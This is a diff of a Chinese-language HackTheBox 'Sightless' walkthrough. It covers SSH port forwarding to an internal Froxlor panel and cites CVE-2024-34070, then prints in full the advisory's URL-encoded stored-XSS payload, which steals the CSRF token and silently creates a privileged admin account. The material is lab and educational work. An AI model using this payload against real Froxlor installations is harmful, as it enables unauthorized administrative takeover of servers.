@@ -165,8 +165,9 @@ udp        0      0 localhost:domain        0.0.0.0:*                           
 udp        0      0 0.0.0.0:bootpc          0.0.0.0:*
 ```
 #### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
+#### 鄙人输入了8282:127.0.0.1:8080 ,在使用burpsuite的时候，自找苦吃
 ```
-[★]$ ssh michael@sightless.htb -L 8282:127.0.0.1:8080
+[★]$ ssh michael@sightless.htb -L 8081:127.0.0.1:8080  
 The authenticity of host 'sightless.htb (10.129.243.28)' can't be established.
 ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
 This host key is known by the following other names/addresses:
@@ -181,6 +182,7 @@ michael@sightless:~$
 图
 #### 在访问端口时，我们会看到一个Froxlor登录页面，这是一个轻量级服务器管理软件
 #### https://nvd.nist.gov/vuln/detail/CVE-2024-34070
+
 #### https://github.com/advisories/GHSA-x525-54hf-xr53点击payload.txt是如下的内容：
 ```
 admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
